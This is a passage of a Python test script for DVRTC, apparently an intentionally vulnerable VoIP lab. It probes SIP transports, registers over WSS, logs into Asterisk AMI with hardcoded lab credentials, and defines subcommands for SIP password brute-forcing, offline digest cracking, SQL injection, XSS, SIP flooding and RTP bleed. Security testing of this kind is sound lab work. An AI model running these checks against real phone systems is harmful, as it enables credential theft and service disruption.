    _info("    [*] Testing TCP/5060")
    try:
        tcp_responses = _probe_register_tcp(
            args.host, 5060, args.extension, "DVRTC-Transport-TCP",
        )
        tcp_codes = _sip_codes(tcp_responses)
        results["TCP"] = bool(tcp_codes)
        _info(f"        {'[+]' if tcp_codes else '[!]'} TCP: {sorted(set(tcp_codes)) if tcp_codes else 'no response'}")
    except OSError as exc:
        results["TCP"] = False
        _info(f"        [!] TCP: connection failed ({exc})")

    _info("    [*] Testing TLS/5061")
    try:
        tls_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        tls_ctx.check_hostname = False
        tls_ctx.verify_mode = ssl.CERT_NONE
        tls_responses = _probe_register_tcp(
            args.host, 5061, args.extension, "DVRTC-Transport-TLS",
            transport_name="TLS", ssl_ctx=tls_ctx,
        )
        tls_codes = _sip_codes(tls_responses)
        results["TLS"] = bool(tls_codes)
        _info(f"        {'[+]' if tls_codes else '[!]'} TLS: {sorted(set(tls_codes)) if tls_codes else 'no response'}")
    except OSError as exc:
        results["TLS"] = False
        _info(f"        [!] TLS: connection failed ({exc})")

    _info("    [*] Testing WS/8000")
    try:
        ws_responses = _probe_register_ws(
            args.host, 8000, args.extension, "DVRTC-Transport-WS",
        )
        ws_codes = _sip_codes(ws_responses)
        results["WS"] = bool(ws_codes)
        _info(f"        {'[+]' if ws_codes else '[!]'} WS: {sorted(set(ws_codes)) if ws_codes else 'no response'}")
    except Exception as exc:
        results["WS"] = False
        _info(f"        [!] WS: failed ({exc})")

    _info("    [*] Testing WSS/8443")
    try:
        wss_responses = _probe_register_ws(
            args.host, 8443, args.extension, "DVRTC-Transport-WSS",
            secure=True,
        )
        wss_codes = _sip_codes(wss_responses)
        results["WSS"] = bool(wss_codes)
        _info(f"        {'[+]' if wss_codes else '[!]'} WSS: {sorted(set(wss_codes)) if wss_codes else 'no response'}")
    except Exception as exc:
        results["WSS"] = False
        _info(f"        [!] WSS: failed ({exc})")

    passed = [t for t, ok in results.items() if ok]
    failed = [t for t, ok in results.items() if not ok]
    if failed:
        return _fail(f"SIP transport check: {', '.join(failed)} failed (passed: {', '.join(passed)})")
    _info(f"[+] All SIP transports working: {', '.join(passed)}")
    return 0


def cmd_wss_register(args: argparse.Namespace) -> int:
    """Test authenticated SIP REGISTER over WSS (WebSocket Secure)."""
    from websockets.sync.client import connect as ws_connect

    _info("[*] WSS-register: testing authenticated REGISTER over WSS")
    host = args.host
    port = 8443
    extension = "1000"
    password = "1500"
    formatted_host = _format_uri_host(host)
    uri = f"wss://{formatted_host}:{port}"

    ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE

    local_ip = _local_ip_for_target(host, port)
    dialog = SipDialog.create()

    try:
        with ws_connect(
            uri,
            subprotocols=["sip"],
            ssl_context=ssl_ctx,
            open_timeout=5,
            additional_headers={"Host": f"{formatted_host}:{port}"},
        ) as conn:
            # Step 1: send initial REGISTER to get 401 challenge
            msg1 = _build_register(
                host, extension, local_ip, 0, "DVRTC-WSS-Register",
                cseq=1, dialog=dialog, transport="WS",
            )
            conn.send(msg1)
            try:
                resp1_data = conn.recv(timeout=3)
            except TimeoutError:
                return _fail("WSS register: no response to initial REGISTER")

            raw1 = resp1_data.encode("utf-8") if isinstance(resp1_data, str) else resp1_data
            resp1 = _parse_sip_message(raw1)
            _info(f"    [*] Initial response: {resp1.code}")

            if resp1.code != 401:
                return _fail(f"WSS register: expected 401, got {resp1.code}")

            challenge_info = _extract_digest_challenge([resp1])
            if challenge_info is None:
                return _fail("WSS register: 401 response missing digest challenge")

            # Step 2: send authenticated REGISTER
            auth_header_name, challenge = challenge_info
            auth_value = _build_digest_authorization(
                "REGISTER",
                f"sip:{_format_uri_host(host)}",
                extension,
                password,
                challenge,
            )
            msg2 = _build_register(
                host, extension, local_ip, 0, "DVRTC-WSS-Register",
                cseq=2, dialog=dialog, transport="WS",
                auth_header=(auth_header_name, auth_value),
            )
            conn.send(msg2)
            try:
                resp2_data = conn.recv(timeout=3)
            except TimeoutError:
                return _fail("WSS register: no response to authenticated REGISTER")

            raw2 = resp2_data.encode("utf-8") if isinstance(resp2_data, str) else resp2_data
            resp2 = _parse_sip_message(raw2)
            _info(f"    [*] Auth response: {resp2.code}")

            if resp2.code == 200:
                _info("    [+] Authenticated REGISTER over WSS succeeded")
                _info("[+] WSS register check passed")
                return 0
            return _fail(f"WSS register: expected 200 after auth, got {resp2.code}")
    except Exception as exc:
        return _fail(f"WSS register failed: {exc}")


def _ami_command(host: str, port: int, command: str) -> str:
    """Send a command to Asterisk AMI and return the output."""
    request = (
        "Action: Login\r\n"
        "Username: dvrtc\r\n"
        "Secret: dvrtc\r\n"
        "\r\n"
        "Action: Command\r\n"
        f"Command: {command}\r\n"
        "\r\n"
        "Action: Logoff\r\n"
        "\r\n"
    )
    with socket.create_connection((host, port), timeout=5) as sock:
        sock.sendall(request.encode("utf-8"))
        data = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    return data.decode("utf-8", errors="ignore")


def cmd_callgen_active(args: argparse.Namespace) -> int:
    _info("[*] Callgen-active: checking Asterisk for active calls to extension 1300")
    try:
        output = _ami_command(args.host, args.ami_port, "core show channels")
    except OSError as exc:
        return _fail(f"Could not connect to Asterisk AMI ({exc})")

    # Look for active sipcaller1 channels targeting 1300
    if "sipcaller1" in output and "1300" in output:
        # Count active channels
        for line in output.splitlines():
            if "active calls" in line:
                _info(f"    [+] {line.strip()}")
                break
        _info("[+] Call generator is active")
        return 0

    if "0 active calls" in output:
        return _fail("No active calls found in Asterisk")

    return _fail("Call generator check failed: no sipcaller1 calls to 1300 found")


def cmd_digestleak_registered(args: argparse.Namespace) -> int:
    _info("[*] Digestleak-registered: checking if extension 2000 is registered")
    try:
        output = _run_kamcmd(args.kamcmd_addr, "ul.lookup", "s:location", "s:2000")
    except FileNotFoundError:
        return _fail("kamcmd is not installed")
    except subprocess.TimeoutExpired:
        return _fail("kamcmd timed out")

    output_lower = output.lower()
    if "not found" in output_lower or "error" in output_lower:
        return _fail("Extension 2000 is not registered in usrloc")
    if "contact" in output_lower:
        _info("    [+] Extension 2000 found in usrloc")
        _info("[+] Digest leak target (ext 2000) is registered")
        return 0

    return _fail("Extension 2000 is not registered in usrloc")


def cmd_voicemail(args: argparse.Namespace) -> int:
    _info("[*] Voicemail: testing voicemail by calling extension 1100")
    before_files: set[str] = set()
    try:
        _, before_body = _http_get_text(
            _http_url(args.host, "/voicemail/INBOX/"),
            timeout=5.0,
        )
        before_files = set(re.findall(r'href="([^"]+)"', before_body))
    except urllib.error.URLError:
        pass
    _info(f"    [*] Current voicemail INBOX entries: {len(before_files)}")

    normalized = _normalize_host(args.host)
    account = f"<sip:1000@{normalized};transport=udp>;auth_pass=1500;regint=0"
    _info("    [*] Calling extension 1100 via baresip")
    _run_baresip_session(
        account,
        duration=args.duration,
        dial_uri=f"sip:1100@{normalized}",
    )
    _info("    [*] Baresip call completed, waiting for voicemail processing")
    time.sleep(10)

    try:
        _, after_body = _http_get_text(
            _http_url(args.host, "/voicemail/INBOX/"),
            timeout=5.0,
        )
    except urllib.error.URLError as exc:
        return _fail(f"Could not check voicemail INBOX ({exc})")

    after_files = set(re.findall(r'href="([^"]+)"', after_body))
    new_files = after_files - before_files
    if new_files:
        _info(f"    [+] New voicemail file(s) detected: {len(new_files)}")
        _info("[+] Voicemail check passed")
        return 0

    return _fail("Voicemail check failed: no new voicemail files detected")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="DVRTC smoke and vulnerability checks")
    subparsers = parser.add_subparsers(dest="command", required=True)

    smoke = subparsers.add_parser("smoke", help="Run baseline smoke checks")
    smoke.add_argument("--host", default="127.0.0.1")
    smoke.add_argument("--mysql-port", type=int, default=23306)
    smoke.add_argument("--extension", default="1000")
    smoke.set_defaults(func=cmd_smoke)

    enum = subparsers.add_parser("enum", help="Check SIP extension enumeration")
    enum.add_argument("--host", default="127.0.0.1")
    enum.add_argument("--extension", default="2000")
    enum.set_defaults(func=cmd_enum)

    weak_cred = subparsers.add_parser("weak-cred", help="Check weak SIP credentials")
    weak_cred.add_argument("--host", default="127.0.0.1")
    weak_cred.add_argument("--username", default="1000")
    weak_cred.add_argument("--password", default="1500")
    weak_cred.add_argument("--timeout", type=float, default=25.0)
    weak_cred.set_defaults(func=cmd_weak_cred)

    weak_cred_svcrack = subparsers.add_parser(
        "weak-cred-svcrack",
        help="Brute-force weak SIP credentials with sipvicious_svcrack",
    )
    weak_cred_svcrack.add_argument("--host", default="127.0.0.1")
    weak_cred_svcrack.add_argument("--port", type=int, default=5060)
    weak_cred_svcrack.add_argument("--username", default="1000")
    weak_cred_svcrack.add_argument("--extension", default="")
    weak_cred_svcrack.add_argument("--password-range", default="1000-2000")
    weak_cred_svcrack.add_argument("--zeropadding", type=int, default=0)
    weak_cred_svcrack.add_argument("--reuse-nonce", action="store_true")
    weak_cred_svcrack.add_argument("--expected-password", default="1500")
    weak_cred_svcrack.add_argument("--timeout", type=float, default=30.0)
    weak_cred_svcrack.set_defaults(func=cmd_weak_cred_svcrack)

    sqli = subparsers.add_parser("sqli", help="Check SIP->SQL injection path")
    sqli.add_argument("--host", default="127.0.0.1")
    sqli.add_argument("--extension", default="1000")
    sqli.add_argument("--timeout", type=float, default=15.0)
    sqli.set_defaults(func=cmd_sqli)

    xss = subparsers.add_parser("xss", help="Check SIP->XSS payload path")
    xss.add_argument("--host", default="127.0.0.1")
    xss.add_argument("--extension", default="1000")
    xss.add_argument("--timeout", type=float, default=15.0)
    xss.set_defaults(func=cmd_xss)

    sip_flood = subparsers.add_parser("sip-flood", help="Check SIP flood susceptibility")
    sip_flood.add_argument("--host", default="127.0.0.1")
    sip_flood.add_argument("--extension", default="1000")
    sip_flood.add_argument("--requests", type=int, default=200)
    sip_flood.add_argument("--collect-seconds", type=float, default=4.0)
    sip_flood.add_argument("--min-responses", type=int, default=20)
    sip_flood.set_defaults(func=cmd_sip_flood)

    offline_crack = subparsers.add_parser(
        "offline-crack",
        help="Check offline SIP digest cracking with john",
    )
    offline_crack.add_argument("--hash-line", required=True)
    offline_crack.add_argument("--expected-password", default="2000")
    offline_crack.add_argument(
        "--candidates",
        default="2000,1500,1234,password,admin,joshua,1000",
    )
    offline_crack.add_argument("--max-run-time", type=int, default=8)
    offline_crack.add_argument("--timeout", type=float, default=20.0)
    offline_crack.set_defaults(func=cmd_offline_crack)

    rtp_bleed = subparsers.add_parser("rtp-bleed", help="Check RTP bleed susceptibility")
    rtp_bleed.add_argument("--host", default="127.0.0.1")
    rtp_bleed.add_argument("--rtp-host", default="")
    rtp_bleed.add_argument("--start-port", type=int, default=35000)
    rtp_bleed.add_argument("--end-port", type=int, default=40000)
    rtp_bleed.add_argument("--duration", type=float, default=6.0)
    rtp_bleed.add_argument("--probes", type=int, default=1)
    rtp_bleed.add_argument("--cycle-listen", type=float, default=0.05)
    rtp_bleed.add_argument("--listen", type=float, default=1.0)
    rtp_bleed.add_argument("--payload-type", type=int, default=0)
    rtp_bleed.add_argument("--attempts", type=int, default=3)
    rtp_bleed.set_defaults(func=cmd_rtp_bleed)

    register = subparsers.add_parser("register", help="Check SIP registration and unregistration")
    register.add_argument("--host", default="127.0.0.1")
    register.add_argument("--username", default="1000")
    register.add_argument("--password", default="1500")
    register.add_argument("--local-port", type=int)
    register.add_argument("--register-only", action="store_true")
    register.add_argument("--timeout", type=float, default=5.0)
    register.set_defaults(func=cmd_register)

    bad_auth = subparsers.add_parser("bad-auth", help="Check that wrong passwords are rejected")
    bad_auth.add_argument("--host", default="127.0.0.1")
    bad_auth.add_argument("--username", default="1000")
    bad_auth.add_argument("--timeout", type=float, default=5.0)
    bad_auth.set_defaults(func=cmd_bad_auth)

    sip_transport = subparsers.add_parser("sip-transport", help="Check SIP over all transports")
    sip_transport.add_argument("--host", default="127.0.0.1")
    sip_transport.add_argument("--extension", default="1000")
    sip_transport.set_defaults(func=cmd_sip_transport)

    wss_register = subparsers.add_parser("wss-register", help="Check authenticated REGISTER over WSS")
    wss_register.add_argument("--host", default="127.0.0.1")
    wss_register.set_defaults(func=cmd_wss_register)

    callgen_active = subparsers.add_parser("callgen-active", help="Check call generator is making calls")
    callgen_active.add_argument("--host", default="127.0.0.1")
    callgen_active.add_argument("--ami-port", type=int, default=5038)
    callgen_active.set_defaults(func=cmd_callgen_active)

    digestleak_reg = subparsers.add_parser(
        "digestleak-registered", help="Check extension 2000 is registered",
    )
    digestleak_reg.add_argument("--host", default="127.0.0.1")
    digestleak_reg.add_argument("--kamcmd-addr", default="tcp:127.0.0.1:2046")
    digestleak_reg.set_defaults(func=cmd_digestleak_registered)

    voicemail = subparsers.add_parser("voicemail", help="Check voicemail by calling extension 1100")
    voicemail.add_argument("--host", default="127.0.0.1")
    voicemail.add_argument("--duration", type=float, default=10.0)
    voicemail.set_defaults(func=cmd_voicemail)

    return parser


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()
    return int(args.func(args))


if __name__ == "__main__":
    sys.exit(main())
